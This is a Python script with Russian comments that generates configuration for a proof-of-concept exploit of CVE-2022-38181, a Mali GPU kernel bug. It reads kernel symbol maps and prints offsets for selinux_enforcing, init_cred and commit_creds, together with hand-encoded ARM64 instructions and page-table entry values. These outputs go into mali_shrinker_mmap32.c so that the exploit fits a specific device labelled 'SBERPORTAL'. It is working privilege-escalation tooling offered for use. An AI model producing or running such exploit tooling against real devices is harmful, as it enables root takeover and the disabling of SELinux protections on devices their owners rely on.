#!/usr/bin/env python3
"""Из System.map (или kallsyms-дампа) -> точный SBERPORTAL-блок для PoC CVE-2022-38181.

Использование:
  gen_poc_config.py System.map            # vmlinux System.map
  gen_poc_config.py kallsyms.txt          # вывод /proc/kallsyms

Печатает готовые #define + ADD-иммедиаты + макросы, которые надо вставить
в mali_shrinker_mmap32.c вместо оценочных.
"""
import sys

KERNEL_BASE = 0x1080000          # физическая база загрузки ядра (boot header kernel_addr)
SYMS = ["selinux_enforcing", "sel_read_handle_unknown", "init_cred", "commit_creds"]


def load_sysmap(path):
    s = {}
    for line in open(path, errors="replace"):
        p = line.split()
        if len(p) >= 3:
            try:
                s[p[2]] = int(p[0], 16)
            except ValueError:
                pass
    return s


def load_kallsyms(path):
    s = {}
    for line in open(path, errors="replace"):
        p = line.split()
        if len(p) >= 3 and len(p[1]) == 1 and p[1] in "tTwWrRdDbBvV":
            try:
                s[p[2]] = int(p[0], 16)
            except ValueError:
                pass
    return s


def base_of(s):
    for n in ("_head", "_stext", "stext", "_text"):
        if n in s and s[n]:
            return n, s[n]
    return None, None


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    path = sys.argv[1]
    s = load_kallsyms(path) if path.endswith(".txt") else load_sysmap(path)
    if not s:
        s = load_sysmap(path)  # fallback
    bn, base = base_of(s)
    if base is None:
        print("не найден _head/_text")
        sys.exit(1)

    off = {}
    missing = []
    for n in SYMS:
        if n in s:
            off[n] = s[n] - base
        else:
            missing.append(n)

    print(f"// base {bn} = 0x{base:x}")
    if missing:
        print(f"// НЕ НАЙДЕНЫ: {missing}")
    print()
    print(f"#define SELINUX_ENFORCING_SBERPORTAL        0x{off['selinux_enforcing']:x}")
    print(f"#define SEL_READ_HANDLE_UNKNOWN_SBERPORTAL  0x{off['sel_read_handle_unknown']:x}")
    print(f"#define INIT_CRED_SBERPORTAL                0x{off['init_cred']:x}")
    print(f"#define COMMIT_CREDS_SBERPORTAL             0x{off['commit_creds']:x}")
    ai = 0x91000000 | ((off['init_cred'] & 0xfff) << 10)
    ac = 0x91000108 | ((off['commit_creds'] & 0xfff) << 10)
    print(f"#define ADD_INIT_SBERPORTAL                 0x{ai:08x}   // add x0, x0, #0x{off['init_cred'] & 0xfff:x}")
    print(f"#define ADD_COMMIT_SBERPORTAL               0x{ac:08x}   // add x8, x8, #0x{off['commit_creds'] & 0xfff:x}")
    print()
    print("// физические адреса (для сверки с логом VERIFY):")
    for n in SYMS:
        if n in off:
            phys = off[n] + KERNEL_BASE
            print(f"//   {n:26} off=0x{off[n]:x} phys=0x{phys:x} pte=0x{((phys >> 12) << 12) | 0x443:x}")
    print()
    print("// env-строка для проверки без пересборки:")
    print("// SP_SELINUX=0x%x SP_SEL_READ=0x%x SP_INIT_CRED=0x%x SP_COMMIT_CREDS=0x%x"
          % (off['selinux_enforcing'], off['sel_read_handle_unknown'], off['init_cred'], off['commit_creds']))


if __name__ == "__main__":
    main()
